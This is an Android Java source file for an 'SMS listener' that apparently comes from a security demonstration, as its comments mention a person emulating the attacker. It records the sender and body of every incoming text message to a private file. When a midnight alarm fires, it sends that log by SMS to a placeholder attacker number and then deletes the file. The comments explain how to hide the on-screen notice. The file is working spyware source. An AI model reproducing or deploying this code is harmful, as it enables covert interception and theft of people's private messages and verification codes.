package com.example.nsalerni.smslistener;

import android.content.Context;
import android.content.Intent;
import android.content.BroadcastReceiver;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;

/**
 * SMS Listener class extends BroadcastReceiver and uses onReceive to read any incoming SMS messages
 * that are received while the application is running (in foreground or background).
 */
public class SMSListener extends BroadcastReceiver
{
    String message = null;          // Holds the message received from the person using the app.
    String filename = "smslog.txt"; // Filename of the text file which hold the messages.

    FileOutputStream outputStream = null;       // Used to write to the text file.
    FileInputStream in;                         // Used to read from the text file.
    InputStreamReader inputStreamReader = null;
    BufferedReader bufferedReader = null;

    StringBuilder sb = null;  // Holds the final string containing all the contents of the text file.
    String line = null;       // Holds each line of the text file (used only when reading from the file).

    SmsManager sms = SmsManager.getDefault(); // Manages SMS operations such as sending data, text, and pdu SMS messages.

    File file = null;           // Holds the contents of the text message in the file, along with the sender's phone number.
    String messageBody = null;  // Holds the body of the SMS message.
    String sender = null;       // Holds the sender's phone number.

    /**
     * This method is called when the BroadcastReceiver is receiving an Intent broadcast. In this case,
     * the action we are listening for is when an SMS is received.
     * @param context  The Context in which the receiver is running.
     * @param intent   The Intent being received.
     */
    @Override
    public void onReceive(Context context, Intent intent)
    {
        Intent service = new Intent(context, MainActivity.class); // Create an Intent for the Alarm created in class MainActivity.
        file = new File(context.getFilesDir() + "//" + filename); // Create a new file.

        try
        {
            /*
             *  Create a file and store the contents of the text message in the file,
             *  along with the sender's phone number. These contents will be sent back to the
             *  attacker in an SMS message.
             *
             *  If the intent is the Alarm action created in class MainActivity (set to go off at midnight),
             *  read the contents of the text file and send it back to the attacker as an SMS message.
             *
             */
            if (intent.getAction().equals("com.nsalerni.alarm.ACTION"))
            {
                // Create the file if it doesn't already exist.
                if (!file.exists())
                {
                    file.createNewFile();
                }

                /*
                 * Read from file and store its contents in StringBuilder sb. Note: The contents
                 * of sb will be transferred back to the attacker.
                 */
                in = context.openFileInput(filename);
                inputStreamReader = new InputStreamReader(in);
                bufferedReader = new BufferedReader(inputStreamReader);
                sb = new StringBuilder(); // Holds the entire contents of the text file.

                // While the file still has content, append the line to the StringBuilder sb.
                while ((line = bufferedReader.readLine()) != null)
                {
                    sb.append(line);
                }

                inputStreamReader.close(); // Close the inputStreamReader

                // For testing purposes, log the sender's phone number and message contents.
                Log.d("SMSListener", "Sender's Phone Number: " + sender);
                Log.d("SMSListener", "Message: " + messageBody);
                Log.d("SMSListener", "PATH: " + file.getAbsolutePath());
                Log.d("SMSListener", "ATTACKER: " + sb.toString());

                /*
                 * Send the string with the sms contents (sender's number and message body) back to the attacker.
                 * NOTE: PLEASE REPLACE THE FIRST ARGUMENT IN sendTextMessage WITH THE NUMBER (as a String) OF THE PERSON WHO IS EMULATING THE ATTACKER.
                 */
                sms.sendTextMessage("INSERT ATTACKER'S NUMBER HERE", null, sb.toString(), null, null);

                file.delete(); // After the SMS is sent back to the attacker, delete the file.
            }

            // If the intent received is a SMS received action.
            if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction()))
            {
                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent))
                {
                    messageBody = smsMessage.getDisplayMessageBody();   // The contents of the message.
                    sender = smsMessage.getDisplayOriginatingAddress(); // The phone number of the sender.

                    /*
                     * Create a Toast notification that shows the contents of the message,
                     * along with the sender's phone number.
                     *
                     * Note: Simply comment the following three lines to hide the Toast notification.
                     */
                    int d = Toast.LENGTH_LONG;
                    Toast t = Toast.makeText(context, "Received from: " + sender + " Message: " + messageBody, d);
                    t.show();

                    // Compose the string which will be written to the file.
                    message = "Sender's Phone Number: " + sender + " Message: " + messageBody + " \n";

                    /*
                     *  Create a file and store the contents of the text message in the file,
                     *  along with the sender's phone number. These contents will be sent back to the
                     *  attacker in an SMS message. (see above)
                     *
                     *  Create the outputStream using the filename specified above and context mode set
                     *  to private (only the app can read the data of the file).
                     */
                    outputStream = context.openFileOutput(filename, Context.MODE_APPEND);
                    outputStream.write(message.getBytes());
                    outputStream.close(); // Close the file.
                }
            }
        }
        catch (Exception e)
        {
            Log.e("SMSListener", "SMS Listener Exception " + e);
        }
    }
}
